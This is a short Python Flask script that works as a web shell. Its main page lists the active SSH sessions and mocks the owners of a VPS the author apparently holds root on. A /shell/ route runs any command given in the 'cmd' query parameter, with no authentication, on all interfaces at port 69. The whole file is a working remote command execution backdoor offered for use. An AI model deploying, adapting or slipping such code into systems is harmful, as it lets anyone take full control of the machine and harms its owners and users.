from flask import Flask, request
import subprocess

app=Flask(__name__)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


@app.route('/')
def lol():
    return f"""<div style='background-image: url("https://d3ui957tjb5bqd.cloudfront.net/uploads/images/4/41/41981.pinterest.jpg?1482224066")'><p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w']).decode()}</center><br><b>Visit /shell to execute any command as root.</b></div>"""
  
@app.route('/shell/')
def shell():
    try:
        s=request.args["cmd"]
        return subprocess.check_output(s.split()).decode()
    except:
        return "use cmd parameter to access the shell. it's running on root fren"


#app.run()

app.run(host="0.0.0.0", port=69)
